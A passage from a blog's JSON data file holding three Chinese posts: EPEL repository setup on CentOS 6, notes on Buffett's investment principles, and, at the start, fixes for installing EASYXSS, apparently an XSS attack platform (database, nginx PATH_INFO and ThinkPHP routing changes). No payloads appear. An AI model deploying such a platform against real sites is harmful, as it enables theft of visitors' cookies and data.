。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>EASYXSS项目开源了，很给力的项目，下载地址，</p>\n<pre>\nhttp://wdot.cc/Attack/49.html\n</pre>\n<p>在安装过程中，出现了几个小问题，也许别人会遇到。<br>1.数据库连接问题，<br>使用ThinkPhp DB_DSN连接方式，用户和密码之间用：号<br>2.’URL_MODEL’ &#x3D;&gt; ’0′,<br>如果’URL_MODEL’ &#x3D;&gt; ’0′的话，官方推荐这种方式，但是必须要web服务器支持PATH_INFO,我使用的NGINX默认是不支持的，需要在PHP规则中修改下面代码</p>\n<pre>\nlocation ~ .php($|/) {\nroot /wwwroot;\nfastcgi_pass   127.0.0.1:9000;\nfastcgi_index  index.php;\nfastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#Add pathinfo Start\nfastcgi_split_path_info ^(.+.php)(.*)$;\nfastcgi_param PATH_INFO $fastcgi_path_info;\n#Add Pathinfo End\ninclude        fastcgi_params;\n}\n</pre>\n<p>3.’URL_MODEL’ &#x3D;&gt; ’3′<br>开始我用的’URL_MODEL’ &#x3D;&gt; ’3′,访问后台是正常了，但是一直得不到数据，一直得到”你妹的”，给个妹子吧 。<br>看了一下代码AppLibActionEmptyAction.class.php,在GET操作 URL中，没有index，最终调用不了index 函数<br>把index函数修改为_empty就可以，不是很完美，php不是太懂，就讲究着用吧 。</p>\n"},{"title":"安装epel","date":"2012-04-02T07:01:00.000Z","_content":"原创作品，允许转载，转载时请务必以超链接形式标明文章 <a href=\"http://tonychiu.blog.51cto.com/656605/696442\" target=\"_blank\" rel=\"noopener noreferrer\">原始出处</a> 、作者信息和本声明。否则将追究法律责任。<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a><p><strong>什么是epel</strong></p><p>如果既想获得 RHEL  的高质量、高性能、高可靠性，又需要方便易用(关键是免费)的软件包更新功能，那么 Fedora Project 推出的 EPEL(Extra  Packages for Enterprise  Linux)正好适合你。EPEL(http://fedoraproject.org/wiki/EPEL) 是由 Fedora 社区打造，为  RHEL 及衍生发行版如 CentOS、Scientific Linux 等提供高质量软件包的项目。</p><p>安装<a href=\"http://mirrors.sohu.com/fedora-epel/6/i386/epel-release-6-5.noarch.rpm\">http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-5.noarch.rpm</a></p><p>[root@centos6 ~]# ll /etc/yum.repos.d/<br />total 20<br />-rw-r--r--. 1 root root 1926 Jul&nbsp; 3 10:16 CentOS-Base.repo<br />-rw-r--r--. 1 root root&nbsp; 637 Jul&nbsp; 3 10:16 CentOS-Debuginfo.repo<br />-rw-r--r--. 1 root root&nbsp; 624 Oct 24 13:06 CentOS-Media.repo<br />-rw-r--r--. 1 root root&nbsp; 957 Oct 12&nbsp; 2010 epel.repo<br />-rw-r--r--. 1 root root 1056 Oct 12&nbsp; 2010 epel-testing.repo<br />&nbsp;</p><p>查看epel.repo内容如下</p><p>[epel]<br />name=Extra Packages for Enterprise Linux 6 - $basearch<br />#baseurl=http://download.fedoraproject.org/pub/epel/6/$basearch<br />mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch<br />failovermethod=priority<br />enabled=1<br />gpgcheck=1<br />gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6<br /><br />[epel-debuginfo]<br />name=Extra Packages for Enterprise Linux 6 - $basearch - Debug<br />#baseurl=http://download.fedoraproject.org/pub/epel/6/$basearch/debug<br />mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$ba&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; search<br />failovermethod=priority<br />enabled=0<br />gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6<br />gpgcheck=1<br /><br />[epel-source]<br />name=Extra Packages for Enterprise Linux 6 - $basearch - Source<br />#baseurl=http://download.fedoraproject.org/pub/epel/6/SRPMS<br />mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; asearch<br />failovermethod=priority<br />enabled=0<br />gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6<br />gpgcheck=1</p><p>&nbsp;</p><p>为什么要配置epel源呢</p><p>&nbsp;</p><p>因为rhel6里很多开发包没有在iso里，在epel的源里！rhel6 是建立在fedra 12上的</p><p>感谢kevin的提醒</p><p>本文出自 “<a href=\"http://tonychiu.blog.51cto.com/\">no brothers,no linux</a>” 博客，请务必保留此出处<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a></p>","source":"_posts/安装epel.md","raw":"title: 安装epel\ncategories: [Linux]\ntags: []\ndate: 2012-04-02 15:01:00\n---\n原创作品，允许转载，转载时请务必以超链接形式标明文章 <a href=\"http://tonychiu.blog.51cto.com/656605/696442\" target=\"_blank\" rel=\"noopener noreferrer\">原始出处</a> 、作者信息和本声明。否则将追究法律责任。<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a><p><strong>什么是epel</strong></p><p>如果既想获得 RHEL  的高质量、高性能、高可靠性，又需要方便易用(关键是免费)的软件包更新功能，那么 Fedora Project 推出的 EPEL(Extra  Packages for Enterprise  Linux)正好适合你。EPEL(http://fedoraproject.org/wiki/EPEL) 是由 Fedora 社区打造，为  RHEL 及衍生发行版如 CentOS、Scientific Linux 等提供高质量软件包的项目。</p><p>安装<a href=\"http://mirrors.sohu.com/fedora-epel/6/i386/epel-release-6-5.noarch.rpm\">http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-5.noarch.rpm</a></p><p>[root@centos6 ~]# ll /etc/yum.repos.d/<br />total 20<br />-rw-r--r--. 1 root root 1926 Jul&nbsp; 3 10:16 CentOS-Base.repo<br />-rw-r--r--. 1 root root&nbsp; 637 Jul&nbsp; 3 10:16 CentOS-Debuginfo.repo<br />-rw-r--r--. 1 root root&nbsp; 624 Oct 24 13:06 CentOS-Media.repo<br />-rw-r--r--. 1 root root&nbsp; 957 Oct 12&nbsp; 2010 epel.repo<br />-rw-r--r--. 1 root root 1056 Oct 12&nbsp; 2010 epel-testing.repo<br />&nbsp;</p><p>查看epel.repo内容如下</p><p>[epel]<br />name=Extra Packages for Enterprise Linux 6 - $basearch<br />#baseurl=http://download.fedoraproject.org/pub/epel/6/$basearch<br />mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch<br />failovermethod=priority<br />enabled=1<br />gpgcheck=1<br />gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6<br /><br />[epel-debuginfo]<br />name=Extra Packages for Enterprise Linux 6 - $basearch - Debug<br />#baseurl=http://download.fedoraproject.org/pub/epel/6/$basearch/debug<br />mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$ba&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; search<br />failovermethod=priority<br />enabled=0<br />gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6<br />gpgcheck=1<br /><br />[epel-source]<br />name=Extra Packages for Enterprise Linux 6 - $basearch - Source<br />#baseurl=http://download.fedoraproject.org/pub/epel/6/SRPMS<br />mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; asearch<br />failovermethod=priority<br />enabled=0<br />gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6<br />gpgcheck=1</p><p>&nbsp;</p><p>为什么要配置epel源呢</p><p>&nbsp;</p><p>因为rhel6里很多开发包没有在iso里，在epel的源里！rhel6 是建立在fedra 12上的</p><p>感谢kevin的提醒</p><p>本文出自 “<a href=\"http://tonychiu.blog.51cto.com/\">no brothers,no linux</a>” 博客，请务必保留此出处<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a></p>","slug":"安装epel","published":1,"updated":"2023-04-22T05:38:45.043Z","_id":"clgrjlxkk00907opiecef5yia","comments":1,"layout":"post","photos":[],"link":"","content":"<p>原创作品，允许转载，转载时请务必以超链接形式标明文章 <a href=\"http://tonychiu.blog.51cto.com/656605/696442\" target=\"_blank\" rel=\"noopener noreferrer\">原始出处</a> 、作者信息和本声明。否则将追究法律责任。<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a><p><strong>什么是epel</strong></p><p>如果既想获得 RHEL  的高质量、高性能、高可靠性，又需要方便易用(关键是免费)的软件包更新功能，那么 Fedora Project 推出的 EPEL(Extra  Packages for Enterprise  Linux)正好适合你。EPEL(<a href=\"http://fedoraproject.org/wiki/EPEL\">http://fedoraproject.org/wiki/EPEL</a>) 是由 Fedora 社区打造，为  RHEL 及衍生发行版如 CentOS、Scientific Linux 等提供高质量软件包的项目。</p><p>安装<a href=\"http://mirrors.sohu.com/fedora-epel/6/i386/epel-release-6-5.noarch.rpm\">http://mirrors.sohu.com/fedora-epel/6/x86_64&#x2F;epel-release-6-5.noarch.rpm</a></p><p>[root@centos6 ~]# ll &#x2F;etc&#x2F;yum.repos.d&#x2F;<br />total 20<br />-rw-r–r–. 1 root root 1926 Jul&amp;nbsp; 3 10:16 CentOS-Base.repo<br />-rw-r–r–. 1 root root&amp;nbsp; 637 Jul&amp;nbsp; 3 10:16 CentOS-Debuginfo.repo<br />-rw-r–r–. 1 root root&amp;nbsp; 624 Oct 24 13:06 CentOS-Media.repo<br />-rw-r–r–. 1 root root&amp;nbsp; 957 Oct 12&amp;nbsp; 2010 epel.repo<br />-rw-r–r–. 1 root root 1056 Oct 12&amp;nbsp; 2010 epel-testing.repo<br />&amp;nbsp;</p><p>查看epel.repo内容如下</p><p>[epel]<br />name&#x3D;Extra Packages for Enterprise Linux 6 - $basearch<br />#baseurl&#x3D;<a href=\"http://download.fedoraproject.org/pub/epel/6/$basearch\">http://download.fedoraproject.org/pub/epel/6/$basearch</a><br />mirrorlist&#x3D;<a href=\"https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch\">https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch</a><br />failovermethod&#x3D;priority<br />enabled&#x3D;1<br />gpgcheck&#x3D;1<br />gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-EPEL-6<br /><br />[epel-debuginfo]<br />name&#x3D;Extra Packages for Enterprise Linux 6 - $basearch - Debug<br />#baseurl&#x3D;<a href=\"http://download.fedoraproject.org/pub/epel/6/$basearch/debug\">http://download.fedoraproject.org/pub/epel/6/$basearch/debug</a><br />mirrorlist&#x3D;<a href=\"https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$ba\">https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$ba</a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; search<br />failovermethod&#x3D;priority<br />enabled&#x3D;0<br />gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-EPEL-6<br />gpgcheck&#x3D;1<br /><br />[epel-source]<br />name&#x3D;Extra Packages for Enterprise Linux 6 - $basearch - Source<br />#baseurl&#x3D;<a href=\"http://download.fedoraproject.org/pub/epel/6/SRPMS\">http://download.fedoraproject.org/pub/epel/6/SRPMS</a><br />mirrorlist&#x3D;<a href=\"https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$b\">https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$b</a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; asearch<br />failovermethod&#x3D;priority<br />enabled&#x3D;0<br />gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-EPEL-6<br />gpgcheck&#x3D;1</p><p>&amp;nbsp;</p><p>为什么要配置epel源呢</p><p>&amp;nbsp;</p><p>因为rhel6里很多开发包没有在iso里，在epel的源里！rhel6 是建立在fedra 12上的</p><p>感谢kevin的提醒</p><p>本文出自 “<a href=\"http://tonychiu.blog.51cto.com/\">no brothers,no linux</a>” 博客，请务必保留此出处<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a></p></p>\n","site":{"data":{}},"excerpt":"","more":"<p>原创作品，允许转载，转载时请务必以超链接形式标明文章 <a href=\"http://tonychiu.blog.51cto.com/656605/696442\" target=\"_blank\" rel=\"noopener noreferrer\">原始出处</a> 、作者信息和本声明。否则将追究法律责任。<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a><p><strong>什么是epel</strong></p><p>如果既想获得 RHEL  的高质量、高性能、高可靠性，又需要方便易用(关键是免费)的软件包更新功能，那么 Fedora Project 推出的 EPEL(Extra  Packages for Enterprise  Linux)正好适合你。EPEL(<a href=\"http://fedoraproject.org/wiki/EPEL\">http://fedoraproject.org/wiki/EPEL</a>) 是由 Fedora 社区打造，为  RHEL 及衍生发行版如 CentOS、Scientific Linux 等提供高质量软件包的项目。</p><p>安装<a href=\"http://mirrors.sohu.com/fedora-epel/6/i386/epel-release-6-5.noarch.rpm\">http://mirrors.sohu.com/fedora-epel/6/x86_64&#x2F;epel-release-6-5.noarch.rpm</a></p><p>[root@centos6 ~]# ll &#x2F;etc&#x2F;yum.repos.d&#x2F;<br />total 20<br />-rw-r–r–. 1 root root 1926 Jul&amp;nbsp; 3 10:16 CentOS-Base.repo<br />-rw-r–r–. 1 root root&amp;nbsp; 637 Jul&amp;nbsp; 3 10:16 CentOS-Debuginfo.repo<br />-rw-r–r–. 1 root root&amp;nbsp; 624 Oct 24 13:06 CentOS-Media.repo<br />-rw-r–r–. 1 root root&amp;nbsp; 957 Oct 12&amp;nbsp; 2010 epel.repo<br />-rw-r–r–. 1 root root 1056 Oct 12&amp;nbsp; 2010 epel-testing.repo<br />&amp;nbsp;</p><p>查看epel.repo内容如下</p><p>[epel]<br />name&#x3D;Extra Packages for Enterprise Linux 6 - $basearch<br />#baseurl&#x3D;<a href=\"http://download.fedoraproject.org/pub/epel/6/$basearch\">http://download.fedoraproject.org/pub/epel/6/$basearch</a><br />mirrorlist&#x3D;<a href=\"https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch\">https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch</a><br />failovermethod&#x3D;priority<br />enabled&#x3D;1<br />gpgcheck&#x3D;1<br />gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-EPEL-6<br /><br />[epel-debuginfo]<br />name&#x3D;Extra Packages for Enterprise Linux 6 - $basearch - Debug<br />#baseurl&#x3D;<a href=\"http://download.fedoraproject.org/pub/epel/6/$basearch/debug\">http://download.fedoraproject.org/pub/epel/6/$basearch/debug</a><br />mirrorlist&#x3D;<a href=\"https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$ba\">https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$ba</a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; search<br />failovermethod&#x3D;priority<br />enabled&#x3D;0<br />gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-EPEL-6<br />gpgcheck&#x3D;1<br /><br />[epel-source]<br />name&#x3D;Extra Packages for Enterprise Linux 6 - $basearch - Source<br />#baseurl&#x3D;<a href=\"http://download.fedoraproject.org/pub/epel/6/SRPMS\">http://download.fedoraproject.org/pub/epel/6/SRPMS</a><br />mirrorlist&#x3D;<a href=\"https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$b\">https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$b</a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; asearch<br />failovermethod&#x3D;priority<br />enabled&#x3D;0<br />gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-EPEL-6<br />gpgcheck&#x3D;1</p><p>&amp;nbsp;</p><p>为什么要配置epel源呢</p><p>&amp;nbsp;</p><p>因为rhel6里很多开发包没有在iso里，在epel的源里！rhel6 是建立在fedra 12上的</p><p>感谢kevin的提醒</p><p>本文出自 “<a href=\"http://tonychiu.blog.51cto.com/\">no brothers,no linux</a>” 博客，请务必保留此出处<a href=\"http://tonychiu.blog.51cto.com/656605/696442\">http://tonychiu.blog.51cto.com/656605/696442</a></p></p>\n"},{"title":"巴菲特的基础投资理念记录","date":"2020-02-26T13:13:52.000Z","_content":"<strong>虽然市场瞬息万变，但是巴菲特的这些基础投资理念，几十年来却都没有变过。他把这些基础投资理念叫做“永不过时的指导</strong>\n\n&nbsp;\n<p class=\"text-sm-title\">1. 基本原则一：永远不去预测市场</p>\n作者告诉我们，巴菲特很早就宣称过，自己根本没有能力预测整个市场的走向。他在书里举了一个例子。\n\n某些合伙人给巴菲特打电话，说某某股票将会像几个月前那样持续利好，应该赶紧买。但是巴菲特对他们的提议，实际上是不屑一顾的。\n\n巴菲特曾说：“如果他们在2月份就知道道琼斯指数在5月份会达到865点，那他们当时为什么不让我进场？如果合伙人三个月前不能预测道指的走向，那他们凭什么觉得自己突然之间具备了预测能力？”\n\n换句话说，<strong>巴菲特不仅不喜欢自己去预测市场，也无法忍受那些“擅长”预测的人，尤其是在市场趋势出现之后发表马后炮观点的合伙人。他把这种看法称作“偏见”</strong>。\n<p class=\"text-sm-title\">2. 基本原则二：投资“深度价值”</p>\n投资不看市场趋势，看什么呢？看的就是“深度价值”。这条原则也就是著名的“价值投资原则”。\n\n作者认为，<strong>巴菲特所谓的“深度价值”，就是那些产品过硬、经营有方，但是又很不起眼的公司</strong>。一旦发现这样的公司，他就会开始比较这个公司的实际资产和市场估值。如果市场估值过低，那巴菲特就会毫不犹豫地出手，买那个公司的股票。\n\n巴菲特曾经说过：“我们买卖股票，不是基于对市场前景的看法，而是要基于对一个公司前景的看法。”\n\n比如有一次，巴菲特发现了一家默默无闻的公司，名叫“桑伯恩地图”。这家公司做的事情就是给美国的每个城市画地图，而且他们的地图可以精确到每栋楼。巴菲特认为当时的市场严重低估了这个公司的价值，所以他就大量买进这家公司的股票，最后大赚了一笔。\n\n在2020年度致股东公开信中，巴菲特讲到了什么样的企业才值得收购。他提出了三条标准：\n<blockquote>第一，该企业的净有形资本必须取得良好回报。\n\n第二，该企业必须由能干而诚实的管理者管理。\n\n第三，该企业必须以合理的价格买到。</blockquote>\n在现实中，符合这三个要求的大型收购机会很少。不过巴菲特觉得这也没关系，他宁愿等待好的机会，也不会对不好的机会出手。\n\n他曾经说过这么一句话：“只有面对真正的好球时，我才会挥杆打一球”。\n<p class=\"text-big-title\">3. 基本原则三：放长线，钓大鱼</p>\n作者告诉我们，在衡量公司业绩的时候，巴菲特从来不关心短期结果。他认为，三年是衡量一个公司业绩的“最短期限”，他曾经建议投资人，最少要关注一个公司最近五年的业绩。\n\n那么，巴菲特手下的伯克希尔-哈撒韦公司的长期情况又是如何呢？根据最新的财务报告，从1965年到2019年，伯克希尔-哈撒韦公司每股市值的复合年增长率为20.3%，是“标普500”增长率的2倍多。\n\n如果在把这个“长期”的时间延长，从1964年到2019年，伯克希尔-哈撒韦公司的市值增长率是的2744062%，也就是增长了27440倍多，这个数字十分令人吃惊。\n\n在2020年度致股东公开信中，巴菲特再次说明“放长线、钓大鱼”原则的好处：<strong>它不仅有利于增加成功投资带来的收益，也有利于减少失败投资带来的问题。随着时间的流逝，一些错误的、失败的投资，可以被“治愈”。</strong>\n<p class=\"text-sm-title\">4. 基本原则四：业绩的好坏，要知道跟谁比</p>\n巴菲特很早就说过：业绩是相对的。相对的意思，就是有合适的比较对象。\n\n那个用来比较的标杆，就是可以看成“风向标”的美股几大指数，比如道琼斯指数、标准普尔500指数等。\n\n作者告诉我们，<strong>巴菲特曾经视道琼斯指数为标杆，并以跑赢道琼斯指数为目标</strong>。\n\n如果某一年道琼斯指数下跌了10%，而他的投资只跌了5%，他就认为自己获得了胜利；反过来，如果某一年道琼斯上扬了25%，而他的投资只增长了20%，他就觉得自己失败了，坚决不会为此庆祝。\n<p class=\"text-sm-title\">5. 基本原则五：复利</p>\n巴菲特在给合伙人讲解投资基础时，总会谈到他最喜欢的概念：复利收益。他画过一张“蓝图”，告诉合伙人金钱增长的速度是多么惊人：\n\n“假设投资10万美元，年收益是4%，那么10年后你会得到148024美元；按照同样的收益率，30年之后，这个数字会飙升至324337美元。如果把收益率增加到16%，那么10万美元在30年后将增加到850万美元。”\n\n反过来，巴菲特也曾经告诉合伙人，费用、税收等其他被忽略的因素，可能会让财富大幅缩水。\n\n总而言之：<strong>微小的变量在长期也能带来巨大的变化</strong>。","source":"_posts/巴菲特的基础投资理念记录.md","raw":"title: 巴菲特的基础投资理念记录\ncategories: [生活感想]\ntags: []\ndate: 2020-02-26 21:13:52\n---\n<strong>虽然市场瞬息万变，但是巴菲特的这些基础投资理念，几十年来却都没有变过。他把这些基础投资理念叫做“永不过时的指导</strong>\n\n&nbsp;\n<p class=\"text-sm-title\">1. 基本原则一：永远不去预测市场</p>\n作者告诉我们，巴菲特很早就宣称过，自己根本没有能力预测整个市场的走向。他在书里举了一个例子。\n\n某些合伙人给巴菲特打电话，说某某股票将会像几个月前那样持续利好，应该赶紧买。但是巴菲特对他们的提议，实际上是不屑一顾的。\n\n巴菲特曾说：“如果他们在2月份就知道道琼斯指数在5月份会达到865点，那他们当时为什么不让我进场？如果合伙人三个月前不能预测道指的走向，那他们凭什么觉得自己突然之间具备了预测能力？”\n\n换句话说，<strong>巴菲特不仅不喜欢自己去预测市场，也无法忍受那些“擅长”预测的人，尤其是在市场趋势出现之后发表马后炮观点的合伙人。他把这种看法称作“偏见”</strong>。\n<p class=\"text-sm-title\">2. 基本原则二：投资“深度价值”</p>\n投资不看市场趋势，看什么呢？看的就是“深度价值”。这条原则也就是著名的“价值投资原则”。\n\n作者认为，<strong>巴菲特所谓的“深度价值”，就是那些产品过硬、经营有方，但是又很不起眼的公司</strong>。一旦发现这样的公司，他就会开始比较这个公司的实际资产和市场估值。如果市场估值过低，那巴菲特就会毫不犹豫地出手，买那个公司的股票。\n\n巴菲特曾经说过：“我们买卖股票，不是基于对市场前景的看法，而是要基于对一个公司前景的看法。”\n\n比如有一次，巴菲特发现了一家默默无闻的公司，名叫“桑伯恩地图”。这家公司做的事情就是给美国的每个城市画地图，而且他们的地图可以精确到每栋楼。巴菲特认为当时的市场严重低估了这个公司的价值，所以他就大量买进这家公司的股票，最后大赚了一笔。\n\n在2020年度致股东公开信中，巴菲特讲到了什么样的企业才值得收购。他提出了三条标准：\n<blockquote>第一，该企业的净有形资本必须取得良好回报。\n\n第二，该企业必须由能干而诚实的管理者管理。\n\n第三，该企业必须以合理的价格买到。</blockquote>\n在现实中，符合这三个要求的大型收购机会很少。不过巴菲特觉得这也没关系，他宁愿等待好的机会，也不会对不好的机会出手。\n\n他曾经说过这么一句话：“只有面对真正的好球时，我才会挥杆打一球”。\n<p class=\"text-big-title\">3. 